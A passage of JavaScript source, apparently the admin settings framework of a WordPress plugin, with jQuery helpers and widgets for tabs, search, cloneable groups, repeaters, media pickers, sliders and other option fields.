/**
 *
 * -----------------------------------------------------------
 *
 * Shapedplugin Framework
 *
 * -----------------------------------------------------------
 *
 */
; (function ($, window, document, undefined) {
  'use strict';

  //
  // Constants
  //
  var WCGS = WCGS || {};

  WCGS.funcs = {};

  WCGS.vars = {
    onloaded: false,
    $body: $('body'),
    $window: $(window),
    $document: $(document),
    is_rtl: $('body').hasClass('rtl'),
    code_themes: [],
  };

  //
  // Helper Functions
  //
  WCGS.helper = {

    //
    // Generate UID
    //
    uid: function (prefix) {
      return (prefix || '') + Math.random().toString(36).substr(2, 9);
    },

    // Quote regular expression characters
    //
    preg_quote: function (str) {
      return (str + '').replace(/(\[|\-|\])/g, "\\$1");
    },

    //
    // Reneme input names
    //
    name_nested_replace: function ($selector, field_id) {

      var checks = [];
      var regex = new RegExp('(' + WCGS.helper.preg_quote(field_id) + ')\\[(\\d+)\\]', 'g');

      $selector.find(':radio').each(function () {
        if (this.checked || this.orginal_checked) {
          this.orginal_checked = true;
        }
      });

      $selector.each(function (index) {
        $(this).find(':input').each(function () {
          this.name = this.name.replace(regex, field_id + '[' + index + ']');
          if (this.orginal_checked) {
            this.checked = true;
          }
        });
      });

    },

    //
    // Debounce
    //
    debounce: function (callback, threshold, immediate) {
      var timeout;
      return function () {
        var context = this, args = arguments;
        var later = function () {
          timeout = null;
          if (!immediate) {
            callback.apply(context, args);
          }
        };
        var callNow = (immediate && !timeout);
        clearTimeout(timeout);
        timeout = setTimeout(later, threshold);
        if (callNow) {
          callback.apply(context, args);
        }
      };
    },

    //
    // Get a cookie
    //
    get_cookie: function (name) {

      var e, b, cookie = document.cookie, p = name + '=';

      if (!cookie) {
        return;
      }

      b = cookie.indexOf('; ' + p);

      if (b === -1) {
        b = cookie.indexOf(p);

        if (b !== 0) {
          return null;
        }
      } else {
        b += 2;
      }

      e = cookie.indexOf(';', b);

      if (e === -1) {
        e = cookie.length;
      }

      return decodeURIComponent(cookie.substring(b + p.length, e));

    },

    //
    // Set a cookie
    //
    set_cookie: function (name, value, expires, path, domain, secure) {

      var d = new Date();

      if (typeof (expires) === 'object' && expires.toGMTString) {
        expires = expires.toGMTString();
      } else if (parseInt(expires, 10)) {
        d.setTime(d.getTime() + (parseInt(expires, 10) * 1000));
        expires = d.toGMTString();
      } else {
        expires = '';
      }

      document.cookie = name + '=' + encodeURIComponent(value) +
        (expires ? '; expires=' + expires : '') +
        (path ? '; path=' + path : '') +
        (domain ? '; domain=' + domain : '') +
        (secure ? '; secure' : '');

    },

    //
    // Remove a cookie
    //
    remove_cookie: function (name, path, domain, secure) {
      WCGS.helper.set_cookie(name, '', -1000, path, domain, secure);
    },

  };

  //
  // Custom clone for textarea and select clone() bug
  //
  $.fn.wcgs_clone = function () {

    var base = $.fn.clone.apply(this, arguments),
      clone = this.find('select').add(this.filter('select')),
      cloned = base.find('select').add(base.filter('select'));

    for (var i = 0; i < clone.length; ++i) {
      for (var j = 0; j < clone[i].options.length; ++j) {

        if (clone[i].options[j].selected === true) {
          cloned[i].options[j].selected = true;
        }

      }
    }

    this.find(':radio').each(function () {
      this.orginal_checked = this.checked;
    });

    return base;

  };

  //
  // Expand All Options
  //
  $.fn.wcgs_expand_all = function () {
    return this.each(function () {
      $(this).on('click', function (e) {

        e.preventDefault();
        $('.wcgs-wrapper').toggleClass('wcgs-show-all');
        $('.wcgs-section').wcgs_reload_script();
        $(this).find('.fa').toggleClass('fa-indent').toggleClass('fa-outdent');

      });
    });
  };

  //
  // Options Navigation
  //
  $.fn.wcgs_nav_options = function () {
    return this.each(function () {

      var $nav = $(this),
        $links = $nav.find('a'),
        $hidden = $nav.closest('.wcgs').find('.wcgs-section-id'),
        $last_section;

      $(window).on('hashchange', function () {

        var hash = window.location.hash.match(new RegExp('tab=([^&]*)'));
        var slug = hash ? hash[1] : $links.first().attr('href').replace('#tab=', '');
        var $link = $('#wcgs-tab-link-' + slug);



        if ($link.length > 0) {
          $link.closest('.wcgs-tab-depth-0').addClass('wcgs-tab-active').siblings().removeClass('wcgs-tab-active');
          $links.removeClass('wcgs-section-active');
          $link.addClass('wcgs-section-active');

          if ($last_section !== undefined) {
            $last_section.hide();
          }

          var $section = $('#wcgs-section-' + slug);
          $section.css({ display: 'block' });
          $section.wcgs_reload_script();

          $hidden.val(slug);

          $last_section = $section;

        }

      }).trigger('hashchange');

    });
  };

  //
  // Metabox Tabs
  //
  $.fn.wcgs_nav_metabox = function () {
    return this.each(function () {

      var $nav = $(this),
        $links = $nav.find('a'),
        unique_id = $nav.data('unique'),
        post_id = $('#post_ID').val() || 'global',
        $last_section,
        $last_link;

      $links.on('click', function (e) {

        e.preventDefault();

        var $link = $(this),
          section_id = $link.data('section');

        if ($last_link !== undefined) {
          $last_link.removeClass('wcgs-section-active');
        }

        if ($last_section !== undefined) {
          $last_section.hide();
        }

        $link.addClass('wcgs-section-active');

        var $section = $('#wcgs-section-' + section_id);
        $section.css({ display: 'block' });
        $section.wcgs_reload_script();

        WCGS.helper.set_cookie('wcgs-last-metabox-tab-' + post_id + '-' + unique_id, section_id);

        $last_section = $section;
        $last_link = $link;

      });

      var get_cookie = WCGS.helper.get_cookie('wcgs-last-metabox-tab-' + post_id + '-' + unique_id);

      if (get_cookie) {
        $nav.find('a[data-section="' + get_cookie + '"]').trigger('click');
      } else {
        $links.first('a').trigger('click');
      }

    });
  };

  //
  // Metabox Page Templates Listener
  //
  $.fn.wcgs_page_templates = function () {
    if (this.length) {

      $(document).on('change', '.editor-page-attributes__template select, #page_template', function () {

        var maybe_value = $(this).val() || 'default';

        $('.wcgs-page-templates').removeClass('wcgs-show').addClass('wcgs-hide');
        $('.wcgs-page-' + maybe_value.toLowerCase().replace(/[^a-zA-Z0-9]+/g, '-')).removeClass('wcgs-hide').addClass('wcgs-show');

      });

    }
  };

  //
  // Metabox Post Formats Listener
  //
  $.fn.wcgs_post_formats = function () {
    if (this.length) {

      $(document).on('change', '.editor-post-format select, #formatdiv input[name="post_format"]', function () {

        var maybe_value = $(this).val() || 'default';

        // Fallback for classic editor version
        maybe_value = (maybe_value === '0') ? 'default' : maybe_value;

        $('.wcgs-post-formats').removeClass('wcgs-show').addClass('wcgs-hide');
        $('.wcgs-post-format-' + maybe_value).removeClass('wcgs-hide').addClass('wcgs-show');

      });

    }
  };

  //
  // Search
  //
  $.fn.wcgs_search = function () {
    return this.each(function () {

      var $this = $(this),
        $input = $this.find('input');

      $input.on('change keyup', function () {

        var value = $(this).val(),
          $wrapper = $('.wcgs-wrapper'),
          $section = $wrapper.find('.wcgs-section'),
          $fields = $section.find('> .wcgs-field:not(.hidden)'),
          $titles = $fields.find('> .wcgs-title, .wcgs-search-tags');

        if (value.length > 3) {

          $fields.addClass('wcgs-hidden');
          $wrapper.addClass('wcgs-search-all');

          $titles.each(function () {

            var $title = $(this);

            if ($title.text().match(new RegExp('.*?' + value + '.*?', 'i'))) {

              var $field = $title.closest('.wcgs-field');

              $field.removeClass('wcgs-hidden');
              $field.parent().wcgs_reload_script();

            }

          });

        } else {

          $fields.removeClass('wcgs-hidden');
          $wrapper.removeClass('wcgs-search-all');

        }

      });

    });
  };

  //
  // Sticky Header
  //
  $.fn.wcgs_sticky = function () {
    return this.each(function () {

      var $this = $(this),
        $window = $(window),
        $inner = $this.find('.wcgs-header-inner'),
        padding = parseInt($inner.css('padding-left')) + parseInt($inner.css('padding-right')),
        offset = 32,
        scrollTop = 0,
        lastTop = 0,
        ticking = false,
        stickyUpdate = function () {

          var offsetTop = $this.offset().top,
            stickyTop = Math.max(offset, offsetTop - scrollTop),
            winWidth = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);

          if (stickyTop <= offset && winWidth > 782) {
            $inner.css({ width: $this.outerWidth() - padding });
            $this.css({ height: $this.outerHeight() }).addClass('wcgs-sticky');
          } else {
            $inner.removeAttr('style');
            $this.removeAttr('style').removeClass('wcgs-sticky');
          }

        },
        requestTick = function () {

          if (!ticking) {
            requestAnimationFrame(function () {
              stickyUpdate();
              ticking = false;
            });
          }

          ticking = true;

        },
        onSticky = function () {

          scrollTop = $window.scrollTop();
          requestTick();

        };

      $window.on('scroll resize', onSticky);

      onSticky();

    });
  };

  //
  // Dependency System
  //
  $.fn.wcgs_dependency = function () {
    return this.each(function () {

      var $this = $(this),
        ruleset = $.wcgs_deps.createRuleset(),
        depends = [],
        is_global = false;

      $this.children('[data-controller]').each(function () {

        var $field = $(this),
          controllers = $field.data('controller').split('|'),
          conditions = $field.data('condition').split('|'),
          values = $field.data('value').toString().split('|'),
          rules = ruleset;

        if ($field.data('depend-global')) {
          is_global = true;
        }

        $.each(controllers, function (index, depend_id) {

          var value = values[index] || '',
            condition = conditions[index] || conditions[0];

          rules = rules.createRule('[data-depend-id="' + depend_id + '"]', condition, value);

          rules.include($field);

          depends.push(depend_id);

        });

      });

      if (depends.length) {

        if (is_global) {
          $.wcgs_deps.enable(WCGS.vars.$body, ruleset, depends);
        } else {
          $.wcgs_deps.enable($this, ruleset, depends);
        }

      }

    });
  };

  //
  // Field: accordion
  //
  $.fn.wcgs_field_accordion = function () {
    return this.each(function () {

      var $titles = $(this).find('.wcgs-accordion-title');

      $titles.on('click', function () {

        var $title = $(this),
          $icon = $title.find('.wcgs-accordion-icon'),
          $content = $title.next();

        if ($icon.hasClass('fa-angle-right')) {
          $icon.removeClass('fa-angle-right').addClass('fa-angle-down');
        } else {
          $icon.removeClass('fa-angle-down').addClass('fa-angle-right');
        }

        if (!$content.data('opened')) {

          $content.wcgs_reload_script();
          $content.data('opened', true);

        }

        $content.toggleClass('wcgs-accordion-open');

      });

    });
  };

  //
  // Field: background
  //
  $.fn.wcgs_field_background = function () {
    return this.each(function () {
      $(this).find('.wcgs--media').wcgs_reload_script();
    });
  };

  //
  // Field: code_editor
  //
  $.fn.wcgs_field_code_editor = function () {
    return this.each(function () {

      if (typeof CodeMirror !== 'function') { return; }

      var $this = $(this),
        $textarea = $this.find('textarea'),
        $inited = $this.find('.CodeMirror'),
        data_editor = $textarea.data('editor');

      if ($inited.length) {
        $inited.remove();
      }

      var interval = setInterval(function () {
        if ($this.is(':visible')) {

          var code_editor = CodeMirror.fromTextArea($textarea[0], data_editor);

          // load code-mirror theme css.
          if (data_editor.theme !== 'default' && WCGS.vars.code_themes.indexOf(data_editor.theme) === -1) {

            var $cssLink = $('<link>');

            $('#wcgs-codemirror-css').after($cssLink);

            $cssLink.attr({
              rel: 'stylesheet',
              id: 'wcgs-codemirror-' + data_editor.theme + '-css',
              href: data_editor.cdnURL + '/theme/' + data_editor.theme + '.min.css',
              type: 'text/css',
              media: 'all'
            });

            WCGS.vars.code_themes.push(data_editor.theme);

          }

          CodeMirror.modeURL = data_editor.cdnURL + '/mode/%N/%N.min.js';
          CodeMirror.autoLoadMode(code_editor, data_editor.mode);

          code_editor.on('change', function (editor, event) {
            $textarea.val(code_editor.getValue()).trigger('change');
          });

          clearInterval(interval);

        }
      });

    });
  };

  //
  // Field: date
  //
  $.fn.wcgs_field_date = function () {
    return this.each(function () {

      var $this = $(this),
        $inputs = $this.find('input'),
        settings = $this.find('.wcgs-date-settings').data('settings'),
        wrapper = '<div class="wcgs-datepicker-wrapper"></div>',
        $datepicker;

      var defaults = {
        showAnim: '',
        beforeShow: function (input, inst) {
          $(inst.dpDiv).addClass('wcgs-datepicker-wrapper');
        },
        onClose: function (input, inst) {
          $(inst.dpDiv).removeClass('wcgs-datepicker-wrapper');
        },
      };

      settings = $.extend({}, settings, defaults);

      if ($inputs.length === 2) {

        settings = $.extend({}, settings, {
          onSelect: function (selectedDate) {

            var $this = $(this),
              $from = $inputs.first(),
              option = ($inputs.first().attr('id') === $(this).attr('id')) ? 'minDate' : 'maxDate',
              date = $.datepicker.parseDate(settings.dateFormat, selectedDate);

            $inputs.not(this).datepicker('option', option, date);

          }
        });

      }

      $inputs.each(function () {

        var $input = $(this);

        if ($input.hasClass('hasDatepicker')) {
          $input.removeAttr('id').removeClass('hasDatepicker');
        }

        $input.datepicker(settings);

      });

    });
  };

  //
  // Field: fieldset
  //
  $.fn.wcgs_field_fieldset = function () {
    return this.each(function () {
      $(this).find('.wcgs-fieldset-content').wcgs_reload_script();
    });
  };

  //
  // Field: gallery
  //
  $.fn.wcgs_field_gallery = function () {
    return this.each(function () {

      var $this = $(this),
        $edit = $this.find('.wcgs-edit-gallery'),
        $clear = $this.find('.wcgs-clear-gallery'),
        $list = $this.find('ul'),
        $input = $this.find('input'),
        $img = $this.find('img'),
        wp_media_frame;

      $this.on('click', '.wcgs-button, .wcgs-edit-gallery', function (e) {

        var $el = $(this),
          ids = $input.val(),
          what = ($el.hasClass('wcgs-edit-gallery')) ? 'edit' : 'add',
          state = (what === 'add' && !ids.length) ? 'gallery' : 'gallery-edit';

        e.preventDefault();

        if (typeof window.wp === 'undefined' || !window.wp.media || !window.wp.media.gallery) { return; }

        // Open media with state
        if (state === 'gallery') {

          wp_media_frame = window.wp.media({
            library: {
              type: 'image'
            },
            frame: 'post',
            state: 'gallery',
            multiple: true
          });

          wp_media_frame.open();

        } else {

          wp_media_frame = window.wp.media.gallery.edit('[gallery ids="' + ids + '"]');

          if (what === 'add') {
            wp_media_frame.setState('gallery-library');
          }

        }

        // Media Update
        wp_media_frame.on('update', function (selection) {

          $list.empty();

          var selectedIds = selection.models.map(function (attachment) {

            var item = attachment.toJSON();
            var thumb = (typeof item.sizes.thumbnail !== 'undefined') ? item.sizes.thumbnail.url : item.url;

            $list.append('<li><img src="' + thumb + '"></li>');

            return item.id;

          });

          $input.val(selectedIds.join(',')).trigger('change');
          $clear.removeClass('hidden');
          $edit.removeClass('hidden');

        });

      });

      $clear.on('click', function (e) {
        e.preventDefault();
        $list.empty();
        $input.val('').trigger('change');
        $clear.addClass('hidden');
        $edit.addClass('hidden');
      });

    });

  };

  //
  // Field: group
  //
  $.fn.wcgs_field_group = function () {
    return this.each(function () {

      var $this = $(this),
        $fieldset = $this.children('.wcgs-fieldset'),
        $group = $fieldset.length ? $fieldset : $this,
        $wrapper = $group.children('.wcgs-cloneable-wrapper'),
        $hidden = $group.children('.wcgs-cloneable-hidden'),
        $max = $group.children('.wcgs-cloneable-max'),
        $min = $group.children('.wcgs-cloneable-min'),
        field_id = $wrapper.data('field-id'),
        unique_id = $wrapper.data('unique-id'),
        is_number = Boolean(Number($wrapper.data('title-number'))),
        max = parseInt($wrapper.data('max')),
        min = parseInt($wrapper.data('min'));

      // clear accordion arrows if multi-instance
      if ($wrapper.hasClass('ui-accordion')) {
        $wrapper.find('.ui-accordion-header-icon').remove();
      }

      var update_title_numbers = function ($selector) {
        $selector.find('.wcgs-cloneable-title-number').each(function (index) {
          $(this).html(($(this).closest('.wcgs-cloneable-item').index() + 1) + '.');
        });
      };

      $wrapper.accordion({
        header: '> .wcgs-cloneable-item > .wcgs-cloneable-title',
        collapsible: true,
        active: false,
        animate: false,
        heightStyle: 'content',
        icons: {
          'header': 'wcgs-cloneable-header-icon fa fa-angle-right',
          'activeHeader': 'wcgs-cloneable-header-icon fa fa-angle-down'
        },
        activate: function (event, ui) {

          var $panel = ui.newPanel;
          var $header = ui.newHeader;

          if ($panel.length && !$panel.data('opened')) {

            var $fields = $panel.children();
            var $first = $fields.first().find(':input').first();
            var $title = $header.find('.wcgs-cloneable-value');

            $first.on('keyup', function (event) {
              $title.text($first.val());
            });

            $panel.wcgs_reload_script();
            $panel.data('opened', true);
            $panel.data('retry', false);

          } else if ($panel.data('retry')) {

            $panel.wcgs_reload_script_retry();
            $panel.data('retry', false);

          }

        }
      });

      $wrapper.sortable({
        axis: 'y',
        handle: '.wcgs-cloneable-title,.wcgs-cloneable-sort',
        helper: 'original',
        cursor: 'move',
        placeholder: 'widget-placeholder',
        start: function (event, ui) {

          $wrapper.accordion({ active: false });
          $wrapper.sortable('refreshPositions');
          ui.item.children('.wcgs-cloneable-content').data('retry', true);

        },
        update: function (event, ui) {

          WCGS.helper.name_nested_replace($wrapper.children('.wcgs-cloneable-item'), field_id);
          $wrapper.wcgs_customizer_refresh();

          if (is_number) {
            update_title_numbers($wrapper);
          }

        },
      });

      $group.children('.wcgs-cloneable-add').on('click', function (e) {

        e.preventDefault();

        var count = $wrapper.children('.wcgs-cloneable-item').length;

        $min.hide();

        if (max && (count + 1) > max) {
          $max.show();
          return;
        }

        var new_field_id = unique_id + field_id + '[' + count + ']';

        var $cloned_item = $hidden.wcgs_clone(true);

        $cloned_item.removeClass('wcgs-cloneable-hidden');

        $cloned_item.find(':input').each(function () {
          this.name = new_field_id + this.name.replace((this.name.startsWith('_nonce') ? '_nonce' : unique_id), '');
        });

        $cloned_item.find('.wcgs-data-wrapper').each(function () {
          $(this).attr('data-unique-id', new_field_id);
        });

        $wrapper.append($cloned_item);
        $wrapper.accordion('refresh');
        $wrapper.accordion({ active: count });
        $wrapper.wcgs_customizer_refresh();
        $wrapper.wcgs_customizer_listen({ closest: true });

        if (is_number) {
          update_title_numbers($wrapper);
        }

      });

      var event_clone = function (e) {

        e.preventDefault();

        var count = $wrapper.children('.wcgs-cloneable-item').length;

        $min.hide();

        if (max && (count + 1) > max) {
          $max.show();
          return;
        }

        var $this = $(this),
          $parent = $this.parent().parent(),
          $cloned_helper = $parent.children('.wcgs-cloneable-helper').wcgs_clone(true),
          $cloned_title = $parent.children('.wcgs-cloneable-title').wcgs_clone(),
          $cloned_content = $parent.children('.wcgs-cloneable-content').wcgs_clone(),
          cloned_regex = new RegExp('(' + WCGS.helper.preg_quote(field_id) + ')\\[(\\d+)\\]', 'g');

        $cloned_content.find('.wcgs-data-wrapper').each(function () {
          var $this = $(this);
          $this.attr('data-unique-id', $this.attr('data-unique-id').replace(cloned_regex, field_id + '[' + ($parent.index() + 1) + ']'));
        });

        var $cloned = $('<div class="wcgs-cloneable-item" />');

        $cloned.append($cloned_helper);
        $cloned.append($cloned_title);
        $cloned.append($cloned_content);

        $wrapper.children().eq($parent.index()).after($cloned);

        WCGS.helper.name_nested_replace($wrapper.children('.wcgs-cloneable-item'), field_id);

        $wrapper.accordion('refresh');
        $wrapper.wcgs_customizer_refresh();
        $wrapper.wcgs_customizer_listen({ closest: true });

        if (is_number) {
          update_title_numbers($wrapper);
        }

      };

      $wrapper.children('.wcgs-cloneable-item').children('.wcgs-cloneable-helper').on('click', '.wcgs-cloneable-clone', event_clone);
      $group.children('.wcgs-cloneable-hidden').children('.wcgs-cloneable-helper').on('click', '.wcgs-cloneable-clone', event_clone);

      var event_remove = function (e) {

        e.preventDefault();

        var count = $wrapper.children('.wcgs-cloneable-item').length;

        $max.hide();
        $min.hide();

        if (min && (count - 1) < min) {
          $min.show();
          return;
        }

        $(this).closest('.wcgs-cloneable-item').remove();

        WCGS.helper.name_nested_replace($wrapper.children('.wcgs-cloneable-item'), field_id);

        $wrapper.wcgs_customizer_refresh();

        if (is_number) {
          update_title_numbers($wrapper);
        }

      };

      $wrapper.children('.wcgs-cloneable-item').children('.wcgs-cloneable-helper').on('click', '.wcgs-cloneable-remove', event_remove);
      $group.children('.wcgs-cloneable-hidden').children('.wcgs-cloneable-helper').on('click', '.wcgs-cloneable-remove', event_remove);

    });
  };

  //
  // Field: icon
  //
  $.fn.wcgs_field_icon = function () {
    return this.each(function () {

      var $this = $(this);

      $this.on('click', '.wcgs-icon-add', function (e) {

        e.preventDefault();

        var $button = $(this);
        var $modal = $('#wcgs-modal-icon');

        $modal.show();

        WCGS.vars.$icon_target = $this;

        if (!WCGS.vars.icon_modal_loaded) {

          $modal.find('.wcgs-modal-loading').show();

          window.wp.ajax.post('wcgs-get-icons', { nonce: $button.data('nonce') }).done(function (response) {

            $modal.find('.wcgs-modal-loading').hide();

            WCGS.vars.icon_modal_loaded = true;

            var $load = $modal.find('.wcgs-modal-load').html(response.content);

            $load.on('click', 'a', function (e) {

              e.preventDefault();

              var icon = $(this).data('wcgs-icon');

              WCGS.vars.$icon_target.find('i').removeAttr('class').addClass(icon);
              WCGS.vars.$icon_target.find('input').val(icon).trigger('change');
              WCGS.vars.$icon_target.find('.wcgs-icon-preview').removeClass('hidden');
              WCGS.vars.$icon_target.find('.wcgs-icon-remove').removeClass('hidden');

              $modal.hide();

            });

            $modal.on('change keyup', '.wcgs-icon-search', function () {

              var value = $(this).val(),
                $icons = $load.find('a');

              $icons.each(function () {

                var $elem = $(this);

                if ($elem.data('wcgs-icon').search(new RegExp(value, 'i')) < 0) {
                  $elem.hide();
                } else {
                  $elem.show();
                }

              });

            });

            $modal.on('click', '.wcgs-modal-close, .wcgs-modal-overlay', function () {

              $modal.hide();

            });

          });

        }

      });

      $this.on('click', '.wcgs-icon-remove', function (e) {

        e.preventDefault();

        $this.find('.wcgs-icon-preview').addClass('hidden');
        $this.find('input').val('').trigger('change');
        $(this).addClass('hidden');

      });

    });
  };

  //
  // Field: media
  //
  $.fn.wcgs_field_media = function () {
    return this.each(function () {

      var $this = $(this),
        $upload_button = $this.find('.wcgs--button'),
        $remove_button = $this.find('.wcgs--remove'),
        $library = $upload_button.data('library') && $upload_button.data('library').split(',') || '',
        wp_media_frame;

      $upload_button.on('click', function (e) {

        e.preventDefault();

        if (typeof window.wp === 'undefined' || !window.wp.media || !window.wp.media.gallery) {
          return;
        }

        if (wp_media_frame) {
          wp_media_frame.open();
          return;
        }

        wp_media_frame = window.wp.media({
          library: {
            type: $library
          }
        });

        wp_media_frame.on('select', function () {

          var thumbnail;
          var attributes = wp_media_frame.state().get('selection').first().attributes;
          var preview_size = $upload_button.data('preview-size') || 'thumbnail';

          if ($library.length && $library.indexOf(attributes.subtype) === -1 && $library.indexOf(attributes.type) === -1) {
            return;
          }

          $this.find('.wcgs--url').val(attributes.url);
          $this.find('.wcgs--id').val(attributes.id);
          $this.find('.wcgs--width').val(attributes.width);
          $this.find('.wcgs--height').val(attributes.height);
          $this.find('.wcgs--alt').val(attributes.alt);
          $this.find('.wcgs--title').val(attributes.title);
          $this.find('.wcgs--description').val(attributes.description);

          if (typeof attributes.sizes !== 'undefined' && typeof attributes.sizes.thumbnail !== 'undefined' && preview_size === 'thumbnail') {
            thumbnail = attributes.sizes.thumbnail.url;
          } else if (typeof attributes.sizes !== 'undefined' && typeof attributes.sizes.full !== 'undefined') {
            thumbnail = attributes.sizes.full.url;
          } else {
            thumbnail = attributes.icon;
          }

          $remove_button.removeClass('hidden');
          $this.find('.wcgs--preview').removeClass('hidden');
          $this.find('.wcgs--src').attr('src', thumbnail);
          $this.find('.wcgs--thumbnail').val(thumbnail).trigger('change');

        });

        wp_media_frame.open();

      });

      $remove_button.on('click', function (e) {
        e.preventDefault();
        $remove_button.addClass('hidden');
        $this.find('.wcgs--preview').addClass('hidden');
        $this.find('input').val('');
        $this.find('.wcgs--thumbnail').trigger('change');
      });

    });

  };

  //
  // Field: repeater
  //
  $.fn.wcgs_field_repeater = function () {
    return this.each(function () {

      var $this = $(this),
        $fieldset = $this.children('.wcgs-fieldset'),
        $repeater = $fieldset.length ? $fieldset : $this,
        $wrapper = $repeater.children('.wcgs-repeater-wrapper'),
        $hidden = $repeater.children('.wcgs-repeater-hidden'),
        $max = $repeater.children('.wcgs-repeater-max'),
        $min = $repeater.children('.wcgs-repeater-min'),
        field_id = $wrapper.data('field-id'),
        unique_id = $wrapper.data('unique-id'),
        max = parseInt($wrapper.data('max')),
        min = parseInt($wrapper.data('min'));


      $wrapper.children('.wcgs-repeater-item').children('.wcgs-repeater-content').wcgs_reload_script();

      $wrapper.sortable({
        axis: 'y',
        handle: '.wcgs-repeater-sort',
        helper: 'original',
        cursor: 'move',
        placeholder: 'widget-placeholder',
        update: function (event, ui) {

          WCGS.helper.name_nested_replace($wrapper.children('.wcgs-repeater-item'), field_id);
          $wrapper.wcgs_customizer_refresh();
          ui.item.wcgs_reload_script_retry();

        }
      });

      $repeater.children('.wcgs-repeater-add').on('click', function (e) {

        e.preventDefault();

        var count = $wrapper.children('.wcgs-repeater-item').length;

        $min.hide();

        if (max && (count + 1) > max) {
          $max.show();
          return;
        }

        var new_field_id = unique_id + field_id + '[' + count + ']';

        var $cloned_item = $hidden.wcgs_clone(true);

        $cloned_item.removeClass('wcgs-repeater-hidden');

        $cloned_item.find(':input').each(function () {
          this.name = new_field_id + this.name.replace((this.name.startsWith('_nonce') ? '_nonce' : unique_id), '');
        });

        $cloned_item.find('.wcgs-data-wrapper').each(function () {
          $(this).attr('data-unique-id', new_field_id);
        });

        $wrapper.append($cloned_item);
        $cloned_item.children('.wcgs-repeater-content').wcgs_reload_script();
        $wrapper.wcgs_customizer_refresh();
        $wrapper.wcgs_customizer_listen({ closest: true });

      });

      var event_clone = function (e) {

        e.preventDefault();

        var count = $wrapper.children('.wcgs-repeater-item').length;

        $min.hide();

        if (max && (count + 1) > max) {
          $max.show();
          return;
        }

        var $this = $(this),
          $parent = $this.parent().parent().parent(),
          $cloned_content = $parent.children('.wcgs-repeater-content').wcgs_clone(),
          $cloned_helper = $parent.children('.wcgs-repeater-helper').wcgs_clone(true),
          cloned_regex = new RegExp('(' + WCGS.helper.preg_quote(field_id) + ')\\[(\\d+)\\]', 'g');

        $cloned_content.find('.wcgs-data-wrapper').each(function () {
          var $this = $(this);
          $this.attr('data-unique-id', $this.attr('data-unique-id').replace(cloned_regex, field_id + '[' + ($parent.index() + 1) + ']'));
        });

        var $cloned = $('<div class="wcgs-repeater-item" />');

        $cloned.append($cloned_content);
        $cloned.append($cloned_helper);

        $wrapper.children().eq($parent.index()).after($cloned);

        $cloned.children('.wcgs-repeater-content').wcgs_reload_script();

        WCGS.helper.name_nested_replace($wrapper.children('.wcgs-repeater-item'), field_id);

        $wrapper.wcgs_customizer_refresh();
        $wrapper.wcgs_customizer_listen({ closest: true });

      };

      $wrapper.children('.wcgs-repeater-item').children('.wcgs-repeater-helper').on('click', '.wcgs-repeater-clone', event_clone);
      $repeater.children('.wcgs-repeater-hidden').children('.wcgs-repeater-helper').on('click', '.wcgs-repeater-clone', event_clone);

      var event_remove = function (e) {

        e.preventDefault();

        var count = $wrapper.children('.wcgs-repeater-item').length;

        $max.hide();
        $min.hide();

        if (min && (count - 1) < min) {
          $min.show();
          return;
        }

        $(this).closest('.wcgs-repeater-item').remove();

        WCGS.helper.name_nested_replace($wrapper.children('.wcgs-repeater-item'), field_id);

        $wrapper.wcgs_customizer_refresh();

      };

      $wrapper.children('.wcgs-repeater-item').children('.wcgs-repeater-helper').on('click', '.wcgs-repeater-remove', event_remove);
      $repeater.children('.wcgs-repeater-hidden').children('.wcgs-repeater-helper').on('click', '.wcgs-repeater-remove', event_remove);

    });
  };

  //
  // Field: slider
  //
  $.fn.wcgs_field_slider = function () {
    return this.each(function () {

      var $this = $(this),
        $input = $this.find('input'),
        $slider = $this.find('.wcgs-slider-ui'),
        data = $input.data(),
        value = $input.val() || 0;

      if ($slider.hasClass('ui-slider')) {
        $slider.empty();
      }

      $slider.slider({
        range: 'min',
        value: value,
        min: data.min,
        max: data.max,
        step: data.step,
        slide: function (e, o) {
          $input.val(o.value).trigger('change');
        }
      });

      $input.keyup(function () {
        $slider.slider('value', $input.val());
      });

    });
  };

  //
  // Field: sortable
  //
  $.fn.wcgs_field_sortable = function () {
    return this.each(function () {

      var $sortable = $(this).find('.wcgs--sortable');

      $sortable.sortable({
        axis: 'y',
        helper: 'original',
        cursor: 'move',
        placeholder: 'widget-placeholder',
        update: function (event, ui) {
          $sortable.wcgs_customizer_refresh();
        }
      });

      $sortable.find('.wcgs--sortable-content').wcgs_reload_script();

    });
  };

  //
  // Field: sorter
  //
  $.fn.wcgs_field_sorter = function () {
    return this.each(function () {

      var $this = $(this),
        $enabled = $this.find('.wcgs-enabled'),
        $has_disabled = $this.find('.wcgs-disabled'),
        $disabled = ($has_disabled.length) ? $has_disabled : false;

      $enabled.sortable({
        connectWith: $disabled,
        placeholder: 'ui-sortable-placeholder',
        update: function (event, ui) {

          var $el = ui.item.find('input');

          if (ui.item.parent().hasClass('wcgs-enabled')) {
            $el.attr('name', $el.attr('name').replace('disabled', 'enabled'));
          } else {
            $el.attr('name', $el.attr('name').replace('enabled', 'disabled'));
          }

          $this.wcgs_customizer_refresh();

        }
      });

      if ($disabled) {

        $disabled.sortable({
          connectWith: $enabled,
          placeholder: 'ui-sortable-placeholder',
          update: function (event, ui) {
            $this.wcgs_customizer_refresh();
          }
        });

      }

    });
  };

  //
  // Field: spinner
  //
  $.fn.wcgs_field_spinner = function () {
    return this.each(function () {

      var $this = $(this),
        $input = $this.find('input'),
        $inited = $this.find('.ui-spinner-button');

      if ($inited.length) {
        $inited.remove();
      }

      $input.spinner({
        max: $input.data('max') || 100,
        min: $input.data('min') || 0,
        step: $input.data('step') || 1,
        spin: function (event, ui) {
          $input.val(ui.value).trigger('change');
        }
      });


    });
  };

  //
  // Field: switcher
  //
  $.fn.wcgs_field_switcher = function () {
    return this.each(function () {

      var $switcher = $(this).find('.wcgs--switcher');

      $switcher.on('click', function () {

        var value = 0;
        var $input = $switcher.find('input');

        if ($switcher.hasClass('wcgs--active')) {
          $switcher.removeClass('wcgs--active');
        } else {
          value = 1;
          $switcher.addClass('wcgs--active');
        }

        $input.val(value).trigger('change');

      });

    });
  };

  //
  // Field: tabbed
  //
  $.fn.wcgs_field_tabbed = function () {
    return this.each(function () {

      var $this = $(this),
        $links = $this.find('.wcgs-tabbed-nav a'),
        $sections = $this.find('.wcgs-tabbed-section');

      $sections.eq(0).wcgs_reload_script();

      $links.on('click', function (e) {

        e.preventDefault();

        var $link = $(this),
          index = $link.index(),
          $section = $sections.eq(index);

        $link.addClass('wcgs-tabbed-active').siblings().removeClass('wcgs-tabbed-active');
        $section.wcgs_reload_script();
        $section.removeClass('hidden').siblings().addClass('hidden');

      });

    });
  };

  //
  // Field: upload
  //
